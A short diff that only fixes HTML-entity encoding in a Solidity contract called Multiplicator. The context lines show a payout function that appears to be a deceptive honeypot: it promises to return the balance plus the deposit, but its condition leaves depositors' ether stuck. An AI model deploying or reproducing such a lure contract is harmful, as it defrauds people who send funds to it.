@@ -3,16 +3,16 @@ contract Multiplicator
         //Gotta be generous sometimes
         
         address public Owner = msg.sender;
-        mapping (address =&gt; bool) winner; //keeping track of addresses that have already benefited
+        mapping (address => bool) winner; //keeping track of addresses that have already benefited
         
 
 
         function multiplicate(address adr) public payable
         {
             
-            if(msg.value&gt;=this.balance)
+            if(msg.value>=this.balance)
             {
-                require(winner[msg.sender] == false);// every address can only benefit once, don&#39;t be greedy 
+                require(winner[msg.sender] == false);// every address can only benefit once, don't be greedy 
                 winner[msg.sender] = true; 
                 adr.transfer(this.balance+msg.value);
             }
